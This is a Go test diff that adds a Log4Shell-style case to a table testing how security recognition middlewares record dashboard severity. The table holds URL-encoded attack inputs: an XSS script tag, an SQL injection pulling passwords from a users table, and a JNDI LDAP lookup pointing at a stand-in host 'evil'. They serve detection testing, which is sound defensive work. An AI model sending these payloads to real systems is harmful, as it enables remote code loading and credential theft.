@@ -60,6 +60,12 @@ func TestRecognitionMiddlewaresRecordDashboardSeverity(t *testing.T) {
 	}{
 		{"xss", XSSRecognition("sev-xss"), "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
 		{"sqli", SQLiRecognition("sev-sqli"), "id=1%20UNION%20SELECT%20password%20FROM%20users"},
+		// ThreatRecognition is the only one of the three that emits anything
+		// other than critical -- threatCorpora carries the SeverityHigh and
+		// SeverityMedium entries. Without it this test covered two middlewares
+		// that resolve to the same constant, so re-introducing "HIGH" and
+		// "MEDIUM" in threatCorpora left it passing.
+		{"threat", ThreatRecognition("sev-threat"), "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D"},
 	}
 
 	for _, tc := range cases {
